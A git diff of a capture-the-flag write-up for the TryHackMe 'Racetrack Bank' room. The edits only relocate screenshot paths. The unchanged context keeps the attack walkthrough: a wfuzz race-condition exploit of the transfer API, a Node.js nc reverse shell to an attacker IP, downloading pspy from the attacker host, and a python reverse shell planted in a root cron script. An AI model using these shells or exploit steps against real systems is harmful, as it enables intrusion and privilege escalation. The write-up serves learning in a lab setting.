@@ -46,7 +46,7 @@ The open ports are:
 22/tcp   SSH
 80/tcp   HTTP
 
-![Nmap](/assets/images/writeups/racetrack_bank/1.png)
+![Nmap](/assets/images/writeups/thm/racetrack_bank/1.png)
 
 The presence of HTTP immediately made the web application the primary attack surface, while SSH could potentially become useful later if valid credentials were discovered.
 
@@ -56,12 +56,12 @@ The presence of HTTP immediately made the web application the primary attack sur
 
 Navigating to port 80 revealed the Racetrack Bank web application.
 
-![website](/assets/images/writeups/racetrack_bank/2.png)
+![website](/assets/images/writeups/thm/racetrack_bank/2.png)
 
 I created a normal user account named test and logged in. The dashboard displayed:
 `Welcome to Racetrack Bank! To get you started, we have given you 1 gold (how generous of us!). Spend it wisely.`
 
-![website](/assets/images/writeups/racetrack_bank/2.1.png)
+![website](/assets/images/writeups/thm/racetrack_bank/2.1.png)
 
 The application therefore appeared to have some sort of virtual currency system.
 
@@ -69,12 +69,12 @@ The application therefore appeared to have some sort of virtual currency system.
 
 Inspecting the dashboard source revealed a reference to `premiumfeatures.html`.However, accessing the page directly was not permitted with a normal account.
 
-![website](/assets/images/writeups/racetrack_bank/2.2.png)
+![website](/assets/images/writeups/thm/racetrack_bank/2.2.png)
 
 This suggested that the page was protected by some sort of authorization mechanism. The application also provided functionality for transferring gold between users. The login page contained an interesting message:
 `Welcome to racetrack bank, the bank that (will soon) let you transfer funds with racing speed!`
 
-![website](/assets/images/writeups/racetrack_bank/2.3.png)
+![website](/assets/images/writeups/thm/racetrack_bank/2.3.png)
 
 At this point, the phrase "racing speed" became particularly interesting.
 
@@ -87,7 +87,7 @@ At this point, I started to use different tools and techniques to figure out whe
 The transfer functionality became the most interesting attack surface. So i created another account named `test1`
 I then logged in as test and attempted to transfer my initial 1 gold to `test1`. While intercepting the request with `Burpsuite`, I inspected the HTTP request and response carefully.
 
-![website](/assets/images/writeups/racetrack_bank/3.png)
+![website](/assets/images/writeups/thm/racetrack_bank/3.png)
 
 The response headers contained a particularly useful clue. The application was built using the `Express Node.js` framework.
 
@@ -126,7 +126,7 @@ printf '1\n%.0s' {1..11000} > amounts.txt
 ```bash
 wfuzz -c -w gold.txt -u http://racetrackbank.thm/api/givegold -H "Content-Type: application/x-www-form-urlencoded" -b "connect.sid=s%3AG0LRqJLIISi4U2pM_dnywMfkxdWWYxKF.yoSW5jnWn%2BurFCIjqpweh5HSpINX7q2FoBkk3DudZDU" -d "user=test&amount=FUZZ"
 ```
-![race_condition](/assets/images/writeups/racetrack_bank/3.1.png)
+![race_condition](/assets/images/writeups/thm/racetrack_bank/3.1.png)
 
 ### key concept
 
@@ -148,7 +148,7 @@ wfuzz -c -w gold.txt -u http://racetrackbank.thm/api/givegold -H "Content-Type: 
 The important part of the request is `POST /api/givegold` with `user=test1` `amount=FUZZ` and the large number of requests created many concurrent opportunities for the vulnerable balance-handling logic to be triggered.
 After the requests completed, I logged into the `test1` account and observed that the amount of gold received was significantly greater than expected. This confirmed that the transfer functionality could be abused through a race condition.
 
-![race_condition](/assets/images/writeups/racetrack_bank/3.2.png)
+![race_condition](/assets/images/writeups/thm/racetrack_bank/3.2.png)
 
 ### Automating the Exploit
 
@@ -471,7 +471,7 @@ This script can take a few minutes to run but will eventually give us the gold w
 
 With enough gold, I purchased the premium account and gained access to the previously restricted Premium Features page.
 
-![Features](/assets/images/writeups/racetrack_bank/4.png)
+![Features](/assets/images/writeups/thm/racetrack_bank/4.png)
 
 The page contained an input that evaluated mathematical expressions and returned the result.
 
@@ -496,19 +496,19 @@ Alternatively:
 ```bash
 require("child_process").exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker-ip> 4444 >/tmp/f')
 ```
-![RCE](/assets/images/writeups/racetrack_bank/5.png)
+![RCE](/assets/images/writeups/thm/racetrack_bank/5.png)
 
 With shell access, I began enumerating the application files and inspecting its source code which was the cause for RCE.
 
-![RCE](/assets/images/writeups/racetrack_bank/5.1.png)
+![RCE](/assets/images/writeups/thm/racetrack_bank/5.1.png)
 
 The source code helped explain the functionality behind the premium feature and also revealed useful information about the application's configuration. I also discovered database credentials during enumeration.
 
-![shell](/assets/images/writeups/racetrack_bank/6.png)
+![shell](/assets/images/writeups/thm/racetrack_bank/6.png)
 
 After locating the appropriate flag file, I obtained the user flag.
 
-![flag](/assets/images/writeups/racetrack_bank/7.png)
+![flag](/assets/images/writeups/thm/racetrack_bank/7.png)
 
 ---
 
@@ -523,7 +523,7 @@ I searched for SUID binaries:
 ```bash
 find / -perm -4000 -type f 2>/dev/null
 ```
-![suid_binary](/assets/images/writeups/racetrack_bank/8.png)
+![suid_binary](/assets/images/writeups/thm/racetrack_bank/8.png)
 
 There was an interesting SUID binary, but after investigating its behaviour, it did not provide a practical path to root.
 
@@ -534,7 +534,7 @@ I also checked for binaries with Linux capabilities:
 ```bash
 getcap -r / 2>/dev/null
 ```
-![capabilities](/assets/images/writeups/racetrack_bank/9.png)
+![capabilities](/assets/images/writeups/thm/racetrack_bank/9.png)
 
 Although capabilities can sometimes provide an easy privilege-escalation path, the results here did not immediately lead to root. This was a good reminder not to focus exclusively on SUID binaries and capabilities. So i continued with broader system enumeration.
 
@@ -547,7 +547,7 @@ python3 -m http.server 80
 wget http://<attacker-ip>/pspy64
 chmod +x pspy64
 ```
-![pspy64](/assets/images/writeups/racetrack_bank/10.png)
+![pspy64](/assets/images/writeups/thm/racetrack_bank/10.png)
 
 Running pspy64 revealed a recurring cleanup process. This was particularly interesting because it showed a script being executed automatically by a privileged process.
 
@@ -555,7 +555,7 @@ Running pspy64 revealed a recurring cleanup process. This was particularly inter
 
 Further investigation revealed a cleanup script `/home/brian/cleanup/cleanupscript.sh`
 
-![cleanupscript](/assets/images/writeups/racetrack_bank/11.png)
+![cleanupscript](/assets/images/writeups/thm/racetrack_bank/11.png)
 
 The important question was not simply `"What script is being executed?"`, but `Who executes it, and can I modify the script before it runs?` And the script was being executed with elevated privileges while being `writable/modifiable` from my current context. which created the classic cron privilege-escalation opportunity.
 
@@ -566,15 +566,15 @@ cat > cleanupscript.sh <<'EOF'
 python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.132.132",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
 EOF
 ```
-![shell](/assets/images/writeups/racetrack_bank/12.png)
+![shell](/assets/images/writeups/thm/racetrack_bank/12.png)
 
 I then waited for the cron job to execute. A connection was received on my listener, this time with root privileges. Finally, with a root shell, I was able to access the root flag.
 
-![flag](/assets/images/writeups/racetrack_bank/13.png)
+![flag](/assets/images/writeups/thm/racetrack_bank/13.png)
 
 ---
 
-🖼️ **All process screenshot** ![all_process_screenshort](/assets/images/writeups/racetrack_bank/all_process.png)
+🖼️ **All process screenshot** ![all_process_screenshort](/assets/images/writeups/thm/racetrack_bank/all_process.png)
 
 ---
 
